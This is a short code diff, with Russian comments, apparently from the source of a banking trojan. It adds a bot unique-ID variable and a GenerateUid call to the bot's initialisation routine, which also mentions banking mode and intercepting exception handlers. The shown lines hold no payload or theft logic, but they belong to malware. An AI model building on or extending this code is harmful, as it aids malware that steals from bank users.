@@ -32,6 +32,9 @@ char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = "\0";
 // Хэш имени бота
 DWORD BotExeNameHash = 0;
 
+//уид бота, инициализируется в функции BOT::Initialize(), также меняется если будет изменен префикс 
+//через функцию SetBankingMode()
+char BOT_UID[128];
 
 PCHAR BotGetWorkFolder()
 {
@@ -143,6 +146,7 @@ void BOT::Initialize()
 	// Создаём имя рабочей папки
 	GetWorkFolderHash();
 
+	GenerateUid(BOT_UID);
 	// Включаем создание дампа при исключении
 	// Пытаемся встать в начало списка, что дает нам возможность перехватить
 	// ошибку до возможно установленных системных VEH.
